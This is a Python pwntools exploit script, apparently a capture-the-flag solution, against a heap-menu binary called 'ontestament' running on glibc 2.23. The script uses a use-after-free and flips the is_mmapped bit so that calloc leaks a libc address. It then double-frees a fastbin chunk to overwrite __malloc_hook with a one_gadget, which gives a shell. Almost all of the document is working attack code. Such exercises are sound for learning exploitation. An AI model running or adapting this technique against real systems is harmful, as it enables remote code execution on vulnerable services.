#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './ontestament'
context.terminal = ['tmux', 'new-window']
argv = []
env = {'LD_PRELOAD':'./libc.so.6'}
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)
'''
1 = 0x18
2 = 0x30
3 = 0x60
4 = 0x7c
'''
def new_statement(t, content):
    io.sendlineafter("choice: ", "1")
    io.sendlineafter("create:", str(t))
    io.sendafter("content: ", content)

def edit_statement(idx, content):
    io.sendlineafter("choice: ", "3")
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("content: ", content)

def del_statement(idx, overflow=False):
    io.sendlineafter("choice: ", "4")
    if overflow:
        payload = str(idx).encode()
        payload = payload.rjust(5, b'0')
        print("Payload: ", payload)
        io.sendlineafter("index: ", payload)
    else:
        io.sendlineafter("index: ", str(idx))

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB

#breakrva 0x1094
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
UAF in delete testament

Each index can be freed only once

edit testament lets increments values by one but twice per index

pre-tcache libc 2.23
'''

io = start(argv, env=env)

new_statement(1, "A\n") #0
new_statement(4, "A\n") #1
new_statement(3, "A\n") #2

del_statement(1)

# increase byte at index 24 (0x18) from start by 1
# => is_mapped byte
edit_statement(0, '24')

# calloc wont zero out new chunk since it thinks
# that it is mmaped and therefore already zeroed
new_statement(4, "A"*7 + "\n") #3

io.recvline()
leak = io.recvline().replace(b"\n",b"")
leak = leak.ljust(0x8, b"\x00")
leak = u64(leak) - 0x3c4b78

libc.address = leak

print(hex(libc.address))

new_statement(3, "A\n") #4
del_statement(4)
del_statement(2)
del_statement(4, overflow=True)


new_statement(3, p64(libc.sym['__malloc_hook'] - 0x23) + b"\n") #5
new_statement(3, "A\n")
new_statement(3, "A\n")

gadget = libc.address + 0x45226
print(f"Gadget: {hex(gadget)}")
new_statement(3, p8(0x0) * 0x13 + p64(gadget) + b"\n")

new_statement(1, "win\n")

io.interactive()

